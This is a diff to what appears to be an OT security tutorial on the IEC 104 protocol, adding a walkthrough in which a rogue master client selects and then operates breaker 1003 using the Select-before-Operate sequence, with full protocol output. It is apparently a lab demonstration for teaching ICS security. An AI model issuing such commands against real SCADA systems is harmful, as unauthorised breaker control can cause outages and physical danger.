@@ -1,5 +1,5 @@
 ---
-title: "OT Security: IEC 104 Attack and Defend"
+title: "OT Security: IEC 104 Attack - Rogue Master"
 header:
   teaser: /assets/images/iec104.png
   teaser_home_page: true
@@ -423,6 +423,89 @@ Qualifier of interrogation: 20
 ```
 
 Huh? That's odd. The state of the breaker did not change. That is because we are missing a crucial command sequence which is implemented for safety in SCADA systems.
+
 #### Select-before-Operate (SBO)
 
-In order to prevent accidental 
+In order to prevent accidental operation commands from being sent, a Select-before-Operate (SBO) command sequence is in place as a safety measure in most ICS/SCADA systems, including IEC-104 systems. 
+
+An information object must be selected before it can be manipulated, which is what the `s - single command SELECT (SBO)` command is for. So let's go ahead and select `1003` and set its desired value:
+
+```sh
+** Enter action key: 
+s
+2026.01.07 09:05:48.462 Enter breaker IOA (e.g. 1001, 1002, 1003):
+1003
+2026.01.07 09:05:50.873 Enter state (1 = CLOSE / ON, 0 = OPEN / OFF):
+1
+2026.01.07 09:06:25.537 ** SELECT breaker IOA=1003 state=CLOSE
+
+** Enter action key: 
+2026.01.07 09:06:25.540 
+Received ASDU:
+ASDU Type: 45, C_SC_NA_1, Single command
+Cause of transmission: ACTIVATION_CON, test: false, negative con: false
+Originator address: 0, Common address: 65535
+IOA: 1003
+Single Command state on: true, selected: true, qualifier: 0
+```
+
+You can see here that breaker `1003` was selected and its desired value was set to `1`. This can also be verified with the `slected:` flag being `true`. Now, we can go ahead and execute:
+
+```sh
+** Enter action key: 
+e
+2026.01.07 09:08:24.134 Enter breaker IOA (e.g. 1001, 1002, 1003):
+1003
+2026.01.07 09:08:26.398 Enter state (1 = CLOSE / ON, 0 = OPEN / OFF):
+1
+2026.01.07 09:08:31.867 ** EXECUTE breaker IOA=1003 state=CLOSE
+
+** Enter action key: 
+2026.01.07 09:08:31.869 
+Received ASDU:
+ASDU Type: 1, M_SP_NA_1, Single-point information without time tag
+Cause of transmission: SPONTANEOUS, test: false, negative con: false
+Originator address: 0, Common address: 65535
+IOA: 1003
+Single Point, is on: true, blocked: false, substituted: false, not topical: false, invalid: false
+2026.01.07 09:08:31.870 
+Received ASDU:
+ASDU Type: 45, C_SC_NA_1, Single command
+Cause of transmission: ACTIVATION_CON, test: false, negative con: false
+Originator address: 0, Common address: 65535
+IOA: 1003
+Single Command state on: true, selected: false, qualifier: 0
+
+
+i
+2026.01.07 09:08:39.113 ** Sending general interrogation
+
+** Enter action key: 
+2026.01.07 09:08:39.122 
+Received ASDU:
+ASDU Type: 100, C_IC_NA_1, Interrogation command
+Cause of transmission: ACTIVATION_CON, test: false, negative con: false
+Originator address: 0, Common address: 65535
+IOA: 0
+Qualifier of interrogation: 20
+2026.01.07 09:08:39.123 
+Received ASDU:
+ASDU Type: 1, M_SP_NA_1, Single-point information without time tag
+Cause of transmission: INTERROGATED_BY_STATION, test: false, negative con: false
+Originator address: 0, Common address: 65535
+IOA: 1001
+Single Point, is on: true, blocked: false, substituted: false, not topical: false, invalid: false
+IOA: 1002
+Single Point, is on: true, blocked: false, substituted: false, not topical: false, invalid: false
+IOA: 1003
+Single Point, is on: true, blocked: false, substituted: false, not topical: false, invalid: false
+2026.01.07 09:08:39.124 
+Received ASDU:
+ASDU Type: 100, C_IC_NA_1, Interrogation command
+Cause of transmission: ACTIVATION_TERMINATION, test: false, negative con: false
+Originator address: 0, Common address: 65535
+IOA: 0
+Qualifier of interrogation: 20
+```
+
+And we can see that it is set to `true` in the interrogation response. Understanding SBO is crucial for successful execution of our next step.
